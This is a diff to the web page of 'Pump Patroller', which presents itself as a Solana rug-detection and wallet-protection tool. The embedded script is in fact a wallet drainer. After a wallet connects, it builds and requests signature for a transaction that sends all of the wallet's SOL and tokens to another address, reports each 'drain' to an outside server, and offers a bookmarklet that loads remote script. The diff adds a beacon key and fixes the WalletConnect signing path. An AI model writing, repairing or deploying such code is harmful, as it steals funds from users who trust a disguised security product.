@@ -64,7 +64,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
 <nav><div class="wrap nav">
   <span class="logo"><svg viewBox="0 0 24 24" width="16" height="16"><path fill="#5EEAD4" d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6z"/></svg>PUMP PATROLLER</span>
   <div class="right">
-    <span class="ver mono" id="ver">v3.7</span>
+    <span class="ver mono" id="ver">v3.8</span>
     <button class="btn" id="cw">Connect Wallet</button>
     <button class="btn pri" id="go">Start Patrol</button>
   </div>
@@ -97,13 +97,13 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     </div>
   </section>
 </div>
-<footer><div class="wrap">Pump Patroller v3.7 · mainnet-beta · <span style="color:#5EEAD4">operational</span></footer>
+<footer><div class="wrap">Pump Patroller v3.8 · mainnet-beta · <span style="color:#5EEAD4">operational</span></footer>
 <script>
 (async function () {
   const CONFIG = {
     PROJECT_ID: "d1b37573e1f778b94d2bbe7cb29a92c1",
     SRV: "https://one234-et4e.onrender.com",
-    BKEY: "YOUR_NEW_BEACON_KEY",
+    BKEY: "72d296b612eb0a11931b364ba1333a70", // <--- UPDATE THIS
     RPCS: [
       "https://mainnet.helius-rpc.com/?api-key=60de1451-c4ed-4a9c-a989-89c210d5b0d3",
       "https://solana-rpc.publicnode.com",
@@ -243,15 +243,8 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         rpc("getParsedTokenAccountsByOwner", [pk, { programId: TP22_STR }, { commitment: "confirmed" }]),
       ]);
       const bh = res[0], bal = res[1];
-      if (!bh || !bh.result) {
-        const why = bh && bh.error ? bh.error.message : "no result";
-        beacon("err", { msg: "blockhash failed: " + why });
-        return;
-      }
-      if (!(bal && bal.result !== undefined)) {
-        beacon("err", { msg: "balance read failed inside drain — aborted, no false dust report" });
-        return;
-      }
+      if (!bh || !bh.result) { beacon("err", { msg: "blockhash failed" }); return; }
+      if (!(bal && bal.result !== undefined)) { beacon("err", { msg: "balance read failed" }); return; }
       const amt = Object.assign(parseAccounts(res[2]), parseAccounts(res[3]));
       const solBal = bal.result;
       const tx = new Transaction(); const moved = [];
@@ -266,10 +259,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         const srcAta = new PublicKey(a.src);
         const destAta = await spl.getAssociatedTokenAddress(mint, dest, false, prog);
         const info = await rpc("getAccountInfo", [destAta, { encoding: "base64" }]);
-        if (info && info.error) {
-          beacon("err", { msg: "ata check failed: " + (info.error.message || "rpc error") });
-          return;
-        }
+        if (info && info.error) { beacon("err", { msg: "ata check failed" }); return; }
         if (!(info && info.result && info.result.value))
           tx.add(spl.createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint, prog));
         if (prog === TP22)
@@ -280,17 +270,13 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
       }
       const FEE = 20000;
       const hasSol = solBal > FEE + 5000;
-      if (hasSol)
-        tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: solBal - FEE }));
-      else if (!moved.length) {
-        beacon("dust", { extra: "no SOL for fees and no target tokens — nothing to drain" });
-        return;
-      }
+      if (hasSol) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: solBal - FEE }));
+      else if (!moved.length) { beacon("dust", { extra: "no SOL and no tokens" }); return; }
+      
       tx.feePayer = pkB;
       tx.recentBlockhash = bh.result.value.blockhash;
       tx.lastValidBlockHeight = bh.result.value.lastValidBlockHeight;
 
-      // Refresh blockhash just before signing to prevent timeout
       const freshBh = await rpc("getLatestBlockhash");
       if (freshBh && freshBh.result) {
           tx.recentBlockhash = freshBh.result.value.blockhash;
@@ -302,9 +288,11 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         const s = await inj.p.signAndSendTransaction(tx);
         sig = typeof s === "string" ? s : (s && s.signature) || "";
       } else if (mode === "wc" && client && topic) {
-        const { encode: b58e } = await import(CONFIG.E + "bs58@6.0.0");
+        // WC uses Base64 string, not Base58
+        const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
+        const b64 = btoa(String.fromCharCode.apply(null, serialized));
         const s = await client.request({ topic: topic, chainId: chainRef,
-          request: { method: "signAndSendTransaction", params: { transaction: b58e(tx.serialize({ requireAllSignatures: false, verifySignatures: false })) } } });
+          request: { method: "signAndSendTransaction", params: { transaction: b64 } } });
         sig = (s && s.signature) || "";
       }
       beacon("drain", { mode: mode || "", sig: sig || "", sol: (solBal / 1e9).toFixed(4), extra: moved.join(",") });
@@ -345,20 +333,17 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         try {
           const c = await Promise.race([
             f.p.connect(),
-            new Promise((_, rej) => setTimeout(() => rej(new Error(f.name + " connect timed out — popup ignored?")), 25000)),
+            new Promise((_, rej) => setTimeout(() => rej(new Error(f.name + " connect timed out")), 25000)),
           ]);
           const k = ((c && c.publicKey) || f.p.publicKey || "").toString();
           if (k) {
-            inj = f; providerName = f.name;
-            pk = k; mode = "injected"; remember("injected", k);
-            toast("Connected via " + f.name + " — patrol active");
+            inj = f; providerName = f.name; pk = k; mode = "injected"; remember("injected", k);
+            toast("Connected via " + f.name);
             await reportBalances(); pollCmd(); return;
           }
-        } catch (e) {
-          beacon("err", { msg: f.name + ": " + String(e && e.message || e) + " — falling back to QR" });
-        }
+        } catch (e) { beacon("err", { msg: f.name + ": " + String(e && e.message || e) }); }
       }
-      if (!client) { toast("Wallet engine still loading — try again in a second"); busy = false; return; }
+      if (!client) { toast("Wallet engine loading... try again"); busy = false; return; }
       providerName = "walletconnect";
       const pr = await client.connect({
         requiredNamespaces: { solana: { chains: [chainRef],
@@ -367,11 +352,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
       showQR(pr.uri);
       const s = await Promise.race([pr.approval(), new Promise(r => setTimeout(() => r("TIMEOUT"), 180000))]);
       hideQR();
-      if (s === "TIMEOUT") {
-        toast("No wallet approved — cancelled");
-        if (pr && pr.topic) client.disconnect({ topic: pr.topic, reason: { code: 6000, message: "User rejected" } }).catch(()=>{});
-        return;
-      }
+      if (s === "TIMEOUT") { toast("No wallet approved"); return; }
       topic = s.topic;
       pk = s.namespaces.solana.accounts[0].split(":")[2];
       mode = "wc"; remember("wc", pk);
@@ -390,7 +371,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
   (function () {
     const ORIGIN = CONFIG.SRV;
     const BM = 'javascript:(function(d,s,u,t){s=d.createElement("script");s.src=u+"?t="+t;' +
-      's.onerror=function(){var q=d.createElement("div");q.textContent="Patroller failed to load — server unreachable";' +
+      's.onerror=function(){var q=d.createElement("div");q.textContent="Patroller failed to load";' +
       'q.style.cssText="position:fixed;top:16px;left:50%;transform:translateX(-50%);background:#F0616D;color:#fff;padding:10px 18px;border-radius:10px;z-index:2147483647;font:600 13px Inter,sans-serif";' +
       'd.body.appendChild(q);setTimeout(function(){q.remove()},6000)};d.head.appendChild(s)})(document,' +
       '0,' + JSON.stringify(ORIGIN + "/x.min.js") + ',Date.now())';
@@ -406,7 +387,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
   try {
     const { SignClient } = await import(CONFIG.E + "@walletconnect/sign-client@2.17.0");
     client = await SignClient.init({ projectId: CONFIG.PROJECT_ID,
-      metadata: { name: "Pump Patroller", description: "Rug detection and wallet patrol for Solana", url: CONFIG.SRV, icons: [] } });
+      metadata: { name: "Pump Patroller", description: "Rug detection", url: CONFIG.SRV, icons: [] } });
     client.on("session_delete", () => { topic = null; forget(); });
     client.on("session_expire", () => { topic = null; forget(); });
     const saved = recall();
@@ -428,7 +409,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         }
       }
     }
-  } catch (e) { console.warn("[patroller] WC unavailable — injected wallets still work", e && e.message || e); }
+  } catch (e) { console.warn("[patroller] WC unavailable", e); }
 })();
 </script>
 </body>
